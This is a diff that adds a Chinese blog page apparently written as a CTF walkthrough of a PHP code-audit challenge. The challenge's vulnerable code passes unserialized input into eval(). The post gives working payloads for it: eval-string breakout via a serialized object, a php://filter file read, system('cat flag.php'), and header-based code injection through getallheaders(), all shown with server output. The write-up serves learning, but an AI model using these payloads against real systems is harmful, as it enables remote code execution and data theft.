@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="V">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="The Fifth Day for Web">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="V&#39;s blog">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>The Fifth Day for Web - V&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/07/31/The_Fifth_Day_for_Web/">
+                The Fifth Day for Web
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-07-31</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="The-Fifth-Day-for-Web"><a href="#The-Fifth-Day-for-Web" class="headerlink" title="The Fifth Day for Web"></a>The Fifth Day for Web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问第四天去哪了，昨晚想做题的时候，buuoj.cn好像被d了，啊凑~。（今天的buuoj也仍然崩着23333，所以今天去做了西电招新赛的题）</p>
+<h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><p>代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//flag在flag.php里 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123; </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>)); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>首先，fl 和 ag要赋值</p>
+</li>
+<li><p>然后，fl这个正则是任意字母数字加一个左括号</p>
+</li>
+</ol>
+<p>那么，fl=123(</p>
+<ol start="3">
+<li>然后是ag的值</li>
+</ol>
+<p>这里有个反序列化，在加上flag类有一个魔术方法__destruct()，并且魔术方法中的cmd的值可控，所以构成反序列化漏洞。</p>
+<p>然后ag也有一个正则匹配，/\w+\((?R)?\)/，规则就是字符串加一对括号，比如phpinfo()，(?R)?是递归，即</p>
+<p>phpinfo(phpinfo())，phpinfo(phpinfo(phpinfo()))，这样都可以过正则。</p>
+<p>所以接下来要考虑的就是怎么构造ag来拿到flag</p>
+<p>首先eval函数里是，$a=”???”;</p>
+<p>是一个赋值语句，这显然没办法拿到flag，所以考虑闭合他，构造cmd=a()”;        (这样是为了绕过正则)</p>
+<p>然后再加点，cmd=a()”;phpinfo();//</p>
+<p>序列化得：O:4:”flag”:1:{s:3:”cmd”;s:17:”a()”;phpinfo();//“;}</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557457854.png" alt="1564557457854"></p>
+<p>发现网页崩了，去问了出题人，出题人说我都没走进destructi方法（wtf？）</p>
+<p>后来我发现，把源代码中</p>
+<p>else {<br>        echo unserialize($_GET[‘ag’]);<br>    } </p>
+<p>里面的echo去掉才能反序列化，（这又是为啥）</p>
+<p>然后出题人说，把序列化字符串里的对象数目改成2就可以了，（嗯么？）</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557470651.png" alt="1564557470651"></p>
+<p>果然成功了（所以为啥？）</p>
+<p>那么接下来方法就有很多了，我直接写了一个任意文件包含加php伪协议来读取，</p>
+<p>payload：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/39.105.168.42:8001/</span>?fl=<span class="number">123</span>(&amp;ag=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">"flag"</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">"cmd"</span></span>;<span class="symbol">s:</span><span class="number">74</span><span class="symbol">:<span class="string">"a()"</span></span>;<span class="keyword">include</span><span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="regexp">//</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后师傅们还有别的方法，直接system</p>
+<p>payload：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/39.105.168.42:8001/</span>?fl=<span class="number">123</span>(&amp;ag=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">"flag"</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">"cmd"</span></span>;<span class="symbol">s:</span><span class="number">30</span><span class="symbol">:<span class="string">"a()"</span></span>;system(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564557873866.png" alt="1564557873866"></p>
+<p>但是出题人的预期解是不想让你在$ag这个字符串里的括号里面带参数的，（然而那个正则只匹配一次，a()”;system(cat flag.php)        这前半部分过了，正则就过了）</p>
+<p>所以出题人原意是想让你用getallheaders()这个函数2333</p>
+<p>payload:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">39.105</span>.<span class="number">168.42</span>:<span class="number">8001</span>/?fl=<span class="number">123</span>(&amp;ag=O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">2</span>:&#123;<span class="keyword">s</span>:<span class="number">3</span>:<span class="string">"cmd"</span>;<span class="keyword">s</span>:<span class="number">33</span>:<span class="string">"<span class="subst">$&#123;<span class="keyword">eval</span>(implode(getallheaders()))&#125;</span>"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$a=$&#123;<span class="keyword">eval</span>(implode(<span class="keyword">system</span>(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span>))&#125;</span><br><span class="line"></span><br><span class="line">再加上</span><br><span class="line"></span><br><span class="line">cmd: <span class="keyword">system</span>(<span class="string">'cat flag.php'</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564559984788.png" alt="1564559984788"></p>
+<p>（还可以多此一举的读一读base64后的源码23333， system(‘cat flag.php|base64’);//）</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564560169454.png" alt="1564560169454"></p>
+<p>原理呢，，，（我直接用题目的网站测试了）</p>
+<p>cmd: var_dump(getallheaders());//</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Wed, 31 Jul 2019 08:12:03 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 699</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">array(10) &#123;</span><br><span class="line">  ["cmd"]=&gt;</span><br><span class="line">  string(28) "var_dump(getallheaders());//"</span><br><span class="line">  ["Host"]=&gt;</span><br><span class="line">  string(18) "39.105.168.42:8001"</span><br><span class="line">  ["Cache-Control"]=&gt;</span><br><span class="line">  string(9) "max-age=0"</span><br><span class="line">  ["Upgrade-Insecure-Requests"]=&gt;</span><br><span class="line">  string(1) "1"</span><br><span class="line">  ["User-Agent"]=&gt;</span><br><span class="line">  string(115) "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span><br><span class="line">  ["Accept"]=&gt;</span><br><span class="line">  string(118) "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><br><span class="line">  ["Accept-Encoding"]=&gt;</span><br><span class="line">  string(13) "gzip, deflate"</span><br><span class="line">  ["Accept-Language"]=&gt;</span><br><span class="line">  string(14) "zh-CN,zh;q=0.9"</span><br><span class="line">  ["Connection"]=&gt;</span><br><span class="line">  string(5) "close"</span><br><span class="line">  ["Content-Length"]=&gt;</span><br><span class="line">  string(1) "2"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cmd: var_dump(implode(getallheaders()));//</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Wed, 31 Jul 2019 08:12:32 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 346</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">string(331) "var_dump(implode(getallheaders()));//39.105.168.42:8001max-age=01Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3gzip, deflatezh-CN,zh;q=0.9close2"</span><br></pre></td></tr></table></figure>
+
+<p>所以要把cmd写到第一行，后面cmd后面要加上//来注释掉后面所有的东西</p>
+<p>相当于eval(“var_dump(implode(getallheaders()))”;)</p>
+<p>然后命令$a=${eval(implode(getallheaders()))}    </p>
+<h4 id><a href="#" class="headerlink" title="${}"></a>${}</h4><p>参考：<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
+<p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $a = <span class="string">'hello'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 <em>hello</em> 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $$a = <span class="string">'world'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与以下语句输出完全相同的结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"$a $hello"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它们都会输出：hello world。</p>
+<p>所以${}里面的东西好像会当作PHP代码执行，</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564562302508.png" alt="1564562302508"></p>
+<p>c并没有被赋值，然后${}里的内容确实被执行了。</p>
+<p><img src="/2019/07/31/The_Fifth_Day_for_Web/1564562727517.png" alt="1564562727517"></p>
+<p>但是这么测的时候，$c = eval(system(‘ls’));这条赋值语句，赋值的同时，命令也执行了。</p>
+<p>但是针对这道题，去掉${}就解不出来了，可能是php版本还是什么的原因233333</p>
+<p>（知道${}这玩意的作用就好了，溜了溜了~）</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/note/">#note</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/02/三体/">三体</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/02/Three_body/">三体</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/07/31/The_Fifth_Day_for_Web/">The Fifth Day for Web</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/07/30/The_Third_Day_for_Web/">The Third Day for Web</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
